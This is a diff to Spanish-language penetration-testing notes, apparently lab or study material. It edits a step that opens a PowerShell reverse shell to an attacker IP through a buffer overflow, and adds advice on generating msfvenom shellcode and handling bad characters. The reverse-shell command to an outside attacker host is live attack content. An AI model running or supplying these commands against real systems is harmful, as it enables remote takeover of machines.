@@ -194,12 +194,20 @@ PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 
 ```
 
-nota que a diferencia del script como te lo dice, tenes que ejecutar a posteriori esta linea
+nota que a diferencia del script como te lo dice, tenes que ejecutar a posteriori esta linea ya que es la funcion que esta definida en el script y que no se la llama
 
 ```powershell
-PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 443
 ```
 
-lo que hice fue ponerla al final del script para uqe lo haga el a lo ultimo.
+lo que hice fue ponerla al final del script para que llame a la funcion.
+
 >[!important]
->asegurarse de que la **ip atacante** y el **puerto** esten configura
+>asegurarse de que la **ip atacante** y el **puerto** esten configurados a tu contexto
+
+eso generara un nuevo shellcode, reemplazarlo en tu script.
+esto al explotarlo en el buffer overflow nos otorgara acceso desde una Powershell que es muchisimo por lejos mas potente que una cmd normal de windows
+
+>[!note]
+>si tienes muchos `badchars` posiblemente el encoder quizas no sera capaz de generara el shellcode. por lo que si te pasa eso elimina la opcion del encoder para que `msfvenom` se encargue de usar uno adecuado
+
